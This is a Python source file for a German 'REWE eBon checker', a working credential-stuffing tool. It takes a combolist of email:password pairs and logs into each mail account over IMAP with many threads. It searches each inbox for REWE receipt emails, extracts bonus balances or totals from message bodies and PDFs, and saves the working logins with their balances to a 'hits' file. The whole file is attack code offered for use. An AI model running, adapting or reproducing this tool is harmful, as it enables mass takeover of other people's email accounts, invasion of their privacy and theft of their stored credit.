import imaplib
import email
import re
import os
import io
import time
import threading
from email.header import decode_header
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    from colorama import init, Fore
    init(autoreset=True)
except ImportError:
    class Fore:
        RED = GREEN = YELLOW = CYAN = WHITE = RESET = ''

try:
    from pypdf import PdfReader
    PDF_OK = True
except ImportError:
    try:
        from PyPDF2 import PdfReader
        PDF_OK = True
    except ImportError:
        PDF_OK = False

LOGO = r"""
  ____  _______        _______ ____  _   _   _____ _   _  ____ _  __
 |  _ \| ____\ \      / / ____| __ )| \ | | |_   _| | | |/ ___| |/ /
 | |_) |  _|  \ \ /\ / /|  _| |  _ \|  \| |   | | | |_| | |   | ' / 
 |  _ <| |___  \ V  V / | |___| |_) | |\  |   | | |  _  | |___| . \ 
 |_| \_\_____|  \_/\_/  |_____|____/|_| \_|   |_| |_| |_|\____|_|\_\
"""

LOCK = threading.Lock()
HITS_LOCK = threading.Lock()
STATE = {
    "checked": 0, "hits": 0, "no_ebon": 0,
    "bad_login": 0, "connect_err": 0, "money": 0.0,
    "current": "", "status": "Start", "total": 0,
}
TARGET = "ebon@mailing.rewe.de"

HITS_FILE = open("hits.txt", "w", encoding="utf-8")
NOEBON_FILE = open("no_ebon.txt", "w", encoding="utf-8")
BADLOGIN_FILE = open("bad_login.txt", "w", encoding="utf-8")


def write_hit(line):
    with HITS_LOCK:
        HITS_FILE.write(line + "\n")
        HITS_FILE.flush()

def write_noebon(line):
    with HITS_LOCK:
        NOEBON_FILE.write(line + "\n")
        NOEBON_FILE.flush()

def write_badlogin(line):
    with HITS_LOCK:
        BADLOGIN_FILE.write(line + "\n")
        BADLOGIN_FILE.flush()


def show_status():
    os.system("cls" if os.name == "nt" else "clear")
    s = STATE
    pct = (s["checked"] / s["total"] * 100) if s["total"] > 0 else 0
    print(LOGO)
    print("=" * 70)
    print("  Progress    : %d/%d (%.1f%%)" % (s["checked"], s["total"], pct))
    print("  HITS        : %s%d%s" % (Fore.GREEN, s["hits"], Fore.RESET))
    print("  Bad Login   : %s%d%s" % (Fore.RED, s["bad_login"], Fore.RESET))
    print("  Connect Err : %s%d%s" % (Fore.YELLOW, s["connect_err"], Fore.RESET))
    print("  Kein eBon   : %s%d%s" % (Fore.YELLOW, s["no_ebon"], Fore.RESET))
    print("  Money       : %s%.2f EUR%s" % (Fore.GREEN, s["money"], Fore.RESET))
    print("=" * 70)
    print("  Current     : %s%s%s" % (Fore.CYAN, s["current"][:55], Fore.RESET))
    print("  Status      : %s" % s["status"])
    print()


def status_loop():
    while True:
        try:
            show_status()
        except Exception:
            pass
        time.sleep(0.5)


def get_imap_server(e):
    try:
        d = e.split("@", 1)[1].lower()
    except Exception:
        return None
    fixed = {
        "web.de": "imap.web.de", "gmx.de": "imap.gmx.net",
        "gmx.net": "imap.gmx.net", "gmx.com": "imap.gmx.com",
        "t-online.de": "secureimap.t-online.de",
        "freenet.de": "mx.freenet.de", "mail.com": "imap.mail.com",
        "gmail.com": "imap.gmail.com", "googlemail.com": "imap.gmail.com",
        "yahoo.com": "imap.mail.yahoo.com", "yahoo.de": "imap.mail.yahoo.com",
        "aol.com": "imap.aol.com",
        "outlook.com": "outlook.office365.com", "outlook.de": "outlook.office365.com",
        "hotmail.com": "outlook.office365.com", "hotmail.de": "outlook.office365.com",
        "live.com": "outlook.office365.com", "live.de": "outlook.office365.com",
        "yandex.com": "imap.yandex.com", "yandex.ru": "imap.yandex.com",
        "mail.ru": "imap.mail.ru", "1und1.de": "imap.1und1.de",
        "ionos.de": "imap.ionos.de",
    }
    return fixed.get(d, "imap." + d)


def decode_str(s):
    try:
        parts = decode_header(s or "")
        out = ""
        for p, enc in parts:
            if isinstance(p, bytes):
                out += p.decode(enc or "utf-8", errors="ignore")
            else:
                out += p
        return out
    except Exception:
        return str(s or "")


def get_body_and_pdfs(msg):
    text = ""
    pdfs = []
    try:
        if msg.is_multipart():
            for part in msg.walk():
                ct = part.get_content_type()
                fn = part.get_filename()
                if ct in ("text/plain", "text/html"):
                    try:
                        text += part.get_payload(decode=True).decode("utf-8", errors="ignore") + "\n"
                    except Exception:
                        pass
                elif fn and fn.lower().endswith(".pdf"):
                    try:
                        pdfs.append(part.get_payload(decode=True))
                    except Exception:
                        pass
        else:
            try:
                text = msg.get_payload(decode=True).decode("utf-8", errors="ignore")
            except Exception:
                pass
    except Exception:
        pass
    return text, pdfs


def find_amount(text):
    if not text:
        return None
    t = text.replace("&nbsp;", " ").replace("&euro;", "EUR").replace("&#8364;", "EUR")
    t = t.replace("\u00a0", " ")
    t = re.sub(r"<[^>]+>", " ", t)
    t = re.sub(r"[ \t\r\n]+", " ", t)
    pats = [
        r"(?:Aktuelles\s+)?Bonus[\s\-]?Guthaben[:\s]*([0-9]{1,6}[.,][0-9]{2})",
        r"Guthaben[:\s]*([0-9]{1,6}[.,][0-9]{2})",
        r"(?:SUMME|Gesamtbetrag|Gesamt|Zu zahlen|Endbetrag)[:\s]*([0-9]{1,6}[.,][0-9]{2})",
    ]
    for p in pats:
        m = re.search(p, t, re.IGNORECASE)
        if m:
            try:
                return float(m.group(1).replace(",", "."))
            except ValueError:
                continue
    return None


def find_amount_pdf(data):
    if not PDF_OK:
        return None
    try:
        reader = PdfReader(io.BytesIO(data))
        full = ""
        for page in reader.pages[:5]:
            try:
                full += (page.extract_text() or "") + "\n"
            except Exception:
                continue
        return find_amount(full)
    except Exception:
        return None


def try_login(imap, e, p):
    user = e.split("@")[0]
    for u in (e, user):
        try:
            imap.login(u, p)
            return True
        except Exception:
            continue
    return False


def find_ebon_uids(imap):
    """Sucht eBon-Mails von ebon@mailing.rewe.de, neueste zuerst."""
    variants = [
        '(FROM "ebon@mailing.rewe.de")',
        '(TEXT "ebon@mailing.rewe.de")',
        '(FROM "ebon")',
        '(FROM "rewe")',
        '(HEADER FROM "ebon")',
        '(HEADER FROM "rewe")',
    ]
    for v in variants:
        try:
            r, d = imap.uid("search", None, v)
            if r == "OK" and d and d[0]:
                ids = d[0].split()
                if ids:
                    return ids
        except Exception:
            continue
    return []


def check_account(e, p):
    server = get_imap_server(e)
    if not server:
        return e, False, None, "UNSUPPORTED"

    try:
        imap = imaplib.IMAP4_SSL(server, timeout=25)
    except Exception:
        return e, False, None, "CONNECT"

    if not try_login(imap, e, p):
        try:
            imap.logout()
        except Exception:
            pass
        return e, False, None, "BAD_LOGIN"

    try:
        st, _ = imap.select("inbox")
        if st != "OK":
            try:
                imap.logout()
            except Exception:
                pass
            return e, False, None, "SELECT_FAIL"

        uids = find_ebon_uids(imap)
        if not uids:
            try:
                imap.logout()
            except Exception:
                pass
            return e, False, None, "NO_EBON"

        # Neueste eBon zuerst auswerten
        latest_amount = None
        latest_count = 0

        # von neuesten zu aeltesten - max 10 durchsuchen
        for uid in reversed(uids[-10:]):
            try:
                typ, msg_data = imap.uid("fetch", uid, "(RFC822)")
                if typ != "OK" or not msg_data or not isinstance(msg_data[0], tuple):
                    continue
                msg = email.message_from_bytes(msg_data[0][1])
                subj = decode_str(msg.get("Subject", ""))
                body, pdfs = get_body_and_pdfs(msg)
                amt = find_amount(subj + " " + body)
                if amt is None and pdfs:
                    for pdf in pdfs:
                        amt = find_amount_pdf(pdf)
                        if amt is not None:
                            break
                if amt is not None and amt > 0:
                    latest_amount = amt
                    latest_count = len(uids)
                    break
            except Exception:
                continue

        try:
            imap.logout()
        except Exception:
            pass

        if latest_amount is None or latest_amount <= 0:
            return e, False, None, "NO_AMOUNT"

        return e, True, {
            "email": e, "password": p,
            "ebon_count": latest_count,
            "total_amount": latest_amount,
        }, None

    except Exception:
        try:
            imap.logout()
        except Exception:
            pass
        return e, False, None, "ERR"


def worker(e, p):
    with LOCK:
        STATE["current"] = e
        STATE["status"] = "Checke..."

    try:
        _em, hit, data, err = check_account(e, p)
    except Exception:
        with LOCK:
            STATE["checked"] += 1
            STATE["connect_err"] += 1
        return

    with LOCK:
        STATE["checked"] += 1
        if hit and data:
            STATE["hits"] += 1
            STATE["money"] += data["total_amount"]
            line = "%s:%s | REWE eBon | %.2f EUR | eBons: %d" % (
                data["email"], data["password"], data["total_amount"], data["ebon_count"])
            write_hit(line)
            STATE["status"] = "HIT"
        else:
            if err == "BAD_LOGIN":
                STATE["bad_login"] += 1
                write_badlogin("%s:%s" % (e, p))
                STATE["status"] = "Bad Login"
            elif err in ("NO_EBON", "NO_AMOUNT"):
                STATE["no_ebon"] += 1
                write_noebon("%s:%s" % (e, p))
                STATE["status"] = "Kein eBon"
            else:
                STATE["connect_err"] += 1
                STATE["status"] = err or "Error"


def main():
    os.system("cls" if os.name == "nt" else "clear")
    print(LOGO)
    print("=" * 70)
    print("      REWE eBON CHECKER")
    print("=" * 70)
    print()
    if not PDF_OK:
        print("[!] pypdf fehlt - PDFs werden ignoriert")
        print()

    fn = input("[x] Combolist Datei: ").strip()
    if not os.path.exists(fn):
        print("[!] Datei nicht gefunden:", fn)
        return

    with open(fn, "r", encoding="utf-8", errors="ignore") as f:
        raw = [l.strip() for l in f if ":" in l]

    accs = []
    for l in raw:
        pp = l.split(":", 1)
        if len(pp) == 2:
            accs.append((pp[0].strip(), pp[1].strip()))

    if not accs:
        print("[!] Keine Accounts")
        return

    print("[x] Accounts:", len(accs))

    try:
        ti = input("[x] Threads (default 100): ").strip()
        th = int(ti) if ti else 100
        if th < 1:
            th = 100
    except ValueError:
        th = 100

    STATE["total"] = len(accs)
    t = threading.Thread(target=status_loop, daemon=True)
    t.start()

    with ThreadPoolExecutor(max_workers=th) as ex:
        futs = [ex.submit(worker, e, p) for e, p in accs]
        for _ in as_completed(futs):
            pass

    time.sleep(0.5)

    HITS_FILE.close()
    NOEBON_FILE.close()
    BADLOGIN_FILE.close()

    os.system("cls" if os.name == "nt" else "clear")
    print()
    print("=" * 50)
    print("       FERTIG")
    print("=" * 50)
    print()
    print("  Geprueft     :", STATE["checked"])
    print("  HITS         :", STATE["hits"])
    print("  Bad Login    :", STATE["bad_login"])
    print("  Connect Err  :", STATE["connect_err"])
    print("  Kein eBon    :", STATE["no_ebon"])
    print()
    print("  GESAMT-GUTHABEN: %.2f EUR" % STATE["money"])
    print()
    print("  hits.txt       - Hits mit Guthaben")
    print("  no_ebon.txt    - kein eBon oder kein Guthaben")
    print("  bad_login.txt  - Login fehlgeschlagen")
    print()
    input("Enter zum Beenden...")


if __name__ == "__main__":
    main()